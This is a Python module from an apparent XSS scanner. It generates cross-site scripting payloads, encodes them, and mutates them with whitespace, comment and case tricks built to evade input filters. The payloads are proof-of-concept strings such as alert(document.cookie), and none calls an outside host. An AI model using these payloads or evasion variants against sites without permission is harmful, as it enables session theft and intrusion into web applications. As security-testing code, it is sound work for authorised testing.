"""
Payload mutation, encoding, and random-generation utilities.

Three public classes:
- ``PayloadEncoder``       — static encoding helpers (URL, double-URL, HTML entity)
- ``AdvancedPayloadMutator`` — operates on :class:`~payloads.models.PayloadEntry` objects
- ``RandomPayloadGenerator`` — produces novel payloads from component tables
- ``PayloadGenerator``     — legacy string-list mutator (backward compatibility)
"""
from __future__ import annotations

import logging
import random
from urllib.parse import quote, unquote

from payloads.models import PayloadCategory, PayloadEntry

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Encoding
# ---------------------------------------------------------------------------


class PayloadEncoder:
    """Static helpers for encoding XSS payloads in various schemes."""

    @staticmethod
    def url_encode(payload: str) -> str:
        """Percent-encode every character (including safe ones)."""
        return quote(payload, safe="")

    @staticmethod
    def double_url_encode(payload: str) -> str:
        """URL-encode twice: ``<`` → ``%3C`` → ``%253C``."""
        return quote(quote(payload, safe=""), safe="")

    @staticmethod
    def html_encode_decimal(payload: str) -> str:
        """Replace every character with its decimal HTML entity ``&#NNN;``."""
        return "".join(f"&#{ord(c)};" for c in payload)

    @staticmethod
    def html_encode_hex(payload: str) -> str:
        """Replace every character with its hexadecimal HTML entity ``&#xNN;``."""
        return "".join(f"&#x{ord(c):x};" for c in payload)

    @staticmethod
    def decode_url(payload: str) -> str:
        """Reverse URL encoding — mainly useful in tests."""
        return unquote(payload)


# ---------------------------------------------------------------------------
# Advanced mutation (PayloadEntry-based)
# ---------------------------------------------------------------------------

_WHITESPACE_PAIRS: list[tuple[str, str]] = [
    ("<img src=x onerror=", "<img\tsrc=x\tonerror="),
    ("<img src=x onerror=", "<img/src=x\tonerror="),
    ("<svg onload=", "<svg\tonload="),
    ("<svg onload=", "<svg/onload="),
]

_COMMENT_PAIRS: list[tuple[str, str]] = [
    ("alert(1)", "alert/**/( 1)"),
    ("alert(1)", "alert\n(1)"),
    ("onerror=alert", "onerror=/*x*/alert"),
]

_ENTITY_MAP: dict[str, str] = {
    "alert(1)": "&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;",
}


class AdvancedPayloadMutator:
    """
    Produces encoding-based, whitespace-injection, and comment-injection
    variants of :class:`~payloads.models.PayloadEntry` objects.
    """

    def apply_mutations(self, entries: list[PayloadEntry]) -> list[PayloadEntry]:
        """
        Return *entries* extended with all mutation variants.

        Original entries appear first; mutations are appended without
        duplicating any payload text already present.

        Args:
            entries: Base entries to mutate.

        Returns:
            Combined list of originals + unique mutation variants.
        """
        result: list[PayloadEntry] = list(entries)
        seen: set[str] = {e.text for e in entries}

        for entry in entries:
            for mutated in (
                *self._encoding_mutations(entry),
                *self._whitespace_mutations(entry),
                *self._comment_mutations(entry),
            ):
                if mutated.text not in seen:
                    seen.add(mutated.text)
                    result.append(mutated)

        logger.debug(
            "AdvancedPayloadMutator: %d base → %d total", len(entries), len(result)
        )
        return result

    # ------------------------------------------------------------------
    # Mutation strategies
    # ------------------------------------------------------------------

    def _encoding_mutations(self, entry: PayloadEntry) -> list[PayloadEntry]:
        variants: list[PayloadEntry] = []

        url_enc = PayloadEncoder.url_encode(entry.text)
        if url_enc != entry.text:
            variants.append(entry.mutated(url_enc, note="url-encoded"))

        double_enc = PayloadEncoder.double_url_encode(entry.text)
        if double_enc not in {entry.text, url_enc}:
            variants.append(entry.mutated(double_enc, note="double-url-encoded"))

        # Selective HTML entity encoding of the alert call
        for raw, encoded in _ENTITY_MAP.items():
            if raw in entry.text:
                html_enc = entry.text.replace(raw, encoded, 1)
                if html_enc != entry.text:
                    variants.append(entry.mutated(html_enc, note="html-entity-encoded"))

        return variants

    def _whitespace_mutations(self, entry: PayloadEntry) -> list[PayloadEntry]:
        variants: list[PayloadEntry] = []
        for original, replacement in _WHITESPACE_PAIRS:
            if original in entry.text:
                new_text = entry.text.replace(original, replacement, 1)
                if new_text != entry.text:
                    variants.append(entry.mutated(new_text, note="whitespace-mutated"))
        return variants

    def _comment_mutations(self, entry: PayloadEntry) -> list[PayloadEntry]:
        variants: list[PayloadEntry] = []
        for original, replacement in _COMMENT_PAIRS:
            if original in entry.text:
                new_text = entry.text.replace(original, replacement, 1)
                if new_text != entry.text:
                    variants.append(entry.mutated(new_text, note="comment-mutated"))
        return variants


# ---------------------------------------------------------------------------
# Random payload generation
# ---------------------------------------------------------------------------

_RNG_TAGS: list[str] = [
    "img", "input", "svg", "iframe", "video", "audio", "body",
    "details", "object", "select", "textarea",
]
_RNG_EVENTS: list[str] = [
    "onerror", "onload", "onfocus", "onclick", "onmouseover",
    "ontoggle", "onplay", "onpageshow", "onanimationstart",
]
_RNG_EXPRS: list[str] = [
    "alert(1)",
    "prompt(1)",
    "confirm(1)",
    "alert(document.domain)",
    "alert(document.cookie)",
    "console.log(1)",
]
_RNG_EXTRAS: dict[str, str] = {
    "img": "src=x ",
    "input": "autofocus ",
    "video": "autoplay ",
    "audio": "autoplay ",
    "details": "open ",
    "object": "data=x ",
    "select": "autofocus ",
    "textarea": "autofocus ",
}


class RandomPayloadGenerator:
    """
    Builds novel XSS payloads by randomly combining HTML tags, event handlers,
    and JavaScript expressions drawn from curated component tables.

    Args:
        seed: Optional integer seed for reproducible output.
    """

    def __init__(self, seed: int | None = None) -> None:
        self._rng = random.Random(seed)

    def generate(self, count: int = 10) -> list[PayloadEntry]:
        """
        Return *count* unique randomly-generated :class:`~payloads.models.PayloadEntry` objects.

        Args:
            count: Number of unique payloads to produce.

        Returns:
            List of unique randomly-generated payload entries.
        """
        results: list[PayloadEntry] = []
        seen: set[str] = set()
        attempts = 0
        max_attempts = count * 10

        while len(results) < count and attempts < max_attempts:
            attempts += 1
            tag = self._rng.choice(_RNG_TAGS)
            event = self._rng.choice(_RNG_EVENTS)
            expr = self._rng.choice(_RNG_EXPRS)
            extra = _RNG_EXTRAS.get(tag, "")
            text = f"<{tag} {extra}{event}={expr}>"

            if text not in seen:
                seen.add(text)
                results.append(
                    PayloadEntry(
                        text=text,
                        category=PayloadCategory.BASIC,
                        tags=("random", "generated"),
                        description=f"Randomly generated {tag}/{event} variant",
                        severity="medium",
                        source="random-generator",
                    )
                )

        return results


# ---------------------------------------------------------------------------
# Legacy string-list mutator (backward compatibility)
# ---------------------------------------------------------------------------

_ALERT_ALTERNATIVES: list[str] = ["prompt", "confirm", "console.log"]
_ARG_ALTERNATIVES: list[str] = [
    "document.cookie",
    "document.domain",
    "window.location.href",
]
_TAG_CASE_MAPS: list[tuple[str, str]] = [
    ("<script", "<SCRIPT"),
    ("</script", "</SCRIPT"),
    ("<img", "<IMG"),
    ("<svg", "<SVG"),
    ("<body", "<BODY"),
    ("<iframe", "<IFRAME"),
]


class PayloadGenerator:
    """
    Legacy mutator that operates on plain string lists.

    Retained for backward compatibility with existing callers that pass
    ``list[str]``.  New code should prefer :class:`AdvancedPayloadMutator`.
    """

    def apply_mutations(self, base_payloads: list[str]) -> list[str]:
        """
        Return *base_payloads* extended with auto-generated mutations.

        Args:
            base_payloads: Deduplicated list of base XSS payload strings.

        Returns:
            Combined list of originals + unique mutations.
        """
        mutations: list[str] = []
        for payload in base_payloads:
            mutations.extend(self._mutate(payload))

        combined = list(dict.fromkeys(base_payloads + mutations))
        logger.debug(
            "PayloadGenerator: %d base → %d total", len(base_payloads), len(combined)
        )
        return combined

    def _mutate(self, payload: str) -> list[str]:
        variants: list[str] = []
        variants.extend(self._alternate_functions(payload))
        variants.extend(self._alternate_arguments(payload))
        variants.extend(self._case_variants(payload))
        return [v for v in variants if v != payload]

    def _alternate_functions(self, payload: str) -> list[str]:
        if "alert" not in payload:
            return []
        return [payload.replace("alert", alt, 1) for alt in _ALERT_ALTERNATIVES]

    def _alternate_arguments(self, payload: str) -> list[str]:
        if "alert(1)" not in payload:
            return []
        return [
            payload.replace("alert(1)", f"alert({arg})", 1)
            for arg in _ARG_ALTERNATIVES
        ]

    def _case_variants(self, payload: str) -> list[str]:
        variants: list[str] = []
        for lower, upper in _TAG_CASE_MAPS:
            if lower in payload:
                variants.append(payload.replace(lower, upper))
        return variants
